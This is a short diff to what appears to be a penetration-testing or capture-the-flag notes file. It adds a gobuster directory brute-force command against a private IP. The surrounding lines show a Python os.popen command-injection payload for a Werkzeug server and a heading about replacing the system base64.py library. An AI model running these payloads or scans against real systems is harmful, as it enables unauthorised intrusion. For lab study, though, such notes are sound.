@@ -284,7 +284,10 @@ Werkzeug 1.0.1. python based server (python 3.6.8)
 Python’s os module here. The popen method of os module can be used to run system commands on the server.
 code={os.popen("id").read()}
 ```
-
+# Gobuster
+```
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 30 -e -k -x .html,.php,.cgi -u http://192.168.27.114:9998/
+```
 ##### Rplace /usr/lib/python3.8/base64.py
 ```
 ***NOTES***
